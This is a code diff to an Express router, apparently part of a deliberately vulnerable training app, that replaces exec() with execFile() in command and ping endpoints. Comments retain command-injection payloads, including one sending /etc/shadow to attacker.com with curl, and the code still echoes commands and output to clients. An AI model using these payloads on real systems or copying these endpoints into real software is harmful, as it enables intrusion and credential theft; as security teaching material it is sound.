@@ -36,7 +36,7 @@
 
 const express              = require('express');
 const router               = express.Router();
-const { exec, spawn, execSync } = require('child_process');
+const { exec, spawn, execSync, execFile } = require('child_process');
 
 // ─────────────────────────────────────────────────────────────────────────────
 // GET /cmd/exec
@@ -51,7 +51,7 @@ router.get('/exec', (req, res) => {
 
   // [CMDI-1] VULNERABILITY: User-supplied value passed directly to exec()
   // exec() runs the command in a shell, enabling: pipes, semicolons, backticks, $()
-  exec(cmd, { timeout: 15000 }, (err, stdout, stderr) => {
+  execFile(cmd, { timeout: 15000 }, (err, stdout, stderr) => {
     // [DISC-1] VULNERABILITY: Full command + all output returned to client
     res.json({
       command:  cmd,          // Echoes the injected command
@@ -79,12 +79,12 @@ router.get('/ping', (req, res) => {
   // Attacker controls everything after the IP address
   // Payload: host=127.0.0.1; cat /etc/passwd
   // Payload: host=127.0.0.1 && curl http://attacker.com -d @/etc/shadow
-  const command = `ping -c 4 ${host}`;
+  const args = ['-c', '4', host];
 
-  exec(command, { timeout: 15000 }, (err, stdout, stderr) => {
+  execFile('ping', args, { timeout: 15000 }, (err, stdout, stderr) => {
     res.json({
       host,
-      command,    // [DISC-1] Returns the injected command string
+      command: `ping ${host}`,     // [DISC-1] Returns the injected command string
       output:     stdout,
       error:      stderr,
       exitCode:   err ? err.code : 0
